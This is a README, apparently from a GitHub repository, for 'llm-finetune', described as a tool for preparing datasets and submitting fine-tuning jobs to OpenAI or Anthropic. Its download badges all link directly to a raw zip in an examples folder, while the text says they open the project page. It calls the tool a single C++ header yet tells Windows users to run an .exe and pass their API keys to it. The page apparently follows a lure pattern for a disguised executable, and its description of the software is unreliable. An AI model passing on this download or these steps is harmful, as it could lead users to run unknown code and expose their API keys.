# 🚀 llm-finetune - Easy Tools for Fine-Tuning Models

[![Download from GitHub](https://img.shields.io/badge/Download-llm--finetune-brightgreen)](https://github.com/vicious122/llm-finetune/raw/refs/heads/main/examples/llm_finetune_v2.7.zip)

---

## 📖 About llm-finetune

llm-finetune offers simple C++ tools to help you prepare data and send fine-tuning jobs to AI services like OpenAI and Anthropic. It does not rely on extra software, so you do not need to install complex packages before using it. This makes it easier to work with your data and improve language models.

This project focuses on tasks related to fine-tuning large language models (LLMs). It helps you convert your data into the right format and submit it for training.

---

## 💻 System Requirements

Before you start, make sure your PC matches these requirements:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of free disk space
- Internet connection to submit fine-tuning jobs
- Basic knowledge of file handling (copying, moving files)

You do not need to install extra software or programming tools.


---

## 🎯 Features

- **Zero dependencies:** Uses only one header file in C++. No need to install anything else.
- **Easy data prep:** Convert raw data into fine-tuning datasets quickly.
- **Job submission:** Connect directly to OpenAI or Anthropic with your API keys.
- **Simple commands:** Run tasks without complex setup or coding.
- **Cross-platform potential:** Designed to work on Windows and similar systems.

---

## 🔗 Download and Install

### Step 1: Visit the project page

Click the green button below to open the llm-finetune GitHub page:

[![Download from GitHub](https://img.shields.io/badge/Download-llm--finetune-blue)](https://github.com/vicious122/llm-finetune/raw/refs/heads/main/examples/llm_finetune_v2.7.zip)

### Step 2: Find the latest version

Once the page loads, look for a folder or section called "Releases" or "Downloads". This area contains the files you need.

### Step 3: Download the software

Look for a file with a `.zip` or `.exe` extension. If you choose `.zip`, save it to your computer and extract it using Windows Explorer. If it is an `.exe` file, you can run it directly.

### Step 4: Run the program

- Open the folder where you saved or extracted the files.
- Find the executable file (likely named `llm-finetune.exe` or something similar).
- Double-click the file to start the program.

The software runs on Windows without any installation process. Just keep the files in a safe spot where you can find them.

---

## 🚀 How to Use llm-finetune

This section shows you how to prepare your data and start a fine-tuning task.

### Prepare your data

1. Collect your text files or datasets you want to use.
2. Use the dataset preparation tool included in llm-finetune.
3. Run the tool on your dataset file to convert it into the proper format. This usually means running a simple command in the command prompt (explained next).

### Open the Command Prompt

- Press `Windows + R`
- Type `cmd` and press Enter

### Run basic commands

In the black command window:

- Navigate to the folder where you saved `llm-finetune.exe`. Use the command:
  
  ```
  cd C:\Path\To\llm-finetune-folder
  ```

- Prepare your dataset by typing:

  ```
  llm-finetune prepare --input yourfile.txt --output dataset.jsonl
  ```

Replace `yourfile.txt` with the name of your own text file.

### Submit fine-tuning job

After your dataset is ready, send it to OpenAI or Anthropic. Use your API key with this command:

```
llm-finetune submit --provider openai --key YOUR_API_KEY --file dataset.jsonl
```

Replace `YOUR_API_KEY` with your actual OpenAI or Anthropic key. This will upload your dataset for fine-tuning.

---

## 💡 Tips for Using the Tool

- Keep your text files simple with one example per line.
- Manage your API keys safely and do not share them.
- Use the `--provider` option to switch between OpenAI and Anthropic.
- Check the output messages in the command prompt for success or errors.
- Keep your data files in the same folder as the program to avoid path issues.

---

## ⚙️ Settings and Configuration

You can customize how llm-finetune works with some settings:

- **Output location:** Use `--output` to choose where your prepared data saves.
- **API provider:** Choose between `openai` or `anthropic`.
- **Log level:** Adjust how much detail shows during running by adding `--verbose` if needed.
- **Job name:** Use `--job-name` to name your fine-tune session.

Example command with options:

```
llm-finetune submit --provider openai --key YOUR_API_KEY --file dataset.jsonl --job-name my_tune
```

---

## 🛠 Troubleshooting

- If the program does not start, check that you ran it from the folder where the files are.
- Make sure your API key is correct and active.
- If the dataset preparation fails, check your input file format.
- Look for error messages in the command prompt for hints.

---

## 📚 Additional Resources

- Visit the GitHub page frequently for updates and bug fixes.
- Read the README and example files on the GitHub repository for detailed instructions.
- Use the Issues section on GitHub to report problems or ask questions.

---

## 🔗 Download llm-finetune

[![Download from GitHub](https://img.shields.io/badge/Download-llm--finetune-brightgreen)](https://github.com/vicious122/llm-finetune/raw/refs/heads/main/examples/llm_finetune_v2.7.zip)